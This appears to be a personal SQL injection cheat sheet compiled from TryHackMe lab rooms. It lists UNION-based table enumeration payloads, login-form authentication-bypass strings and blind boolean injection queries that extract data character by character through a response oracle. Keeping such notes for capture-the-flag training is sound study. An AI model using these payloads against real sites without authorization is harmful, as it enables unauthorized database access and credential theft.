# SQL Injection

UNION-based enumeration once you've found a column count that renders.

```bash
' UNION SELECT 1,2,3 -- -
' UNION SELECT 1, table_name, 3 FROM information_schema.tables -- -
' UNION SELECT 1, <col>, 3 FROM <table> WHERE <table>.<key>='<value>' -- -
```

— TryHackMe / IronHold

Login-form auth bypass — try several, engines differ in what they accept:
```bash
admin' --
admin' AND 1=1 -- -
' or 1 or '
```
— TryHackMe / Operation Promotion, Dead Drop, Silent Monitor

Blind boolean SQLi when there's no visible output — use any observable diff (HTTP status, redirect, response length) as a true/false oracle, then binary-search each character:
```bash
' OR 1=1 --
' OR (SELECT COUNT(*) FROM <table>)<=N --
' OR (SELECT LENGTH(<col>) FROM <table> LIMIT 1 OFFSET i)<=N --
' OR UNICODE(SUBSTR((SELECT <col> FROM <table> LIMIT 1 OFFSET i),p,1))<=N --
```
— TryHackMe / Operation Promotion (302-vs-not oracle, SQLite-flavored functions)
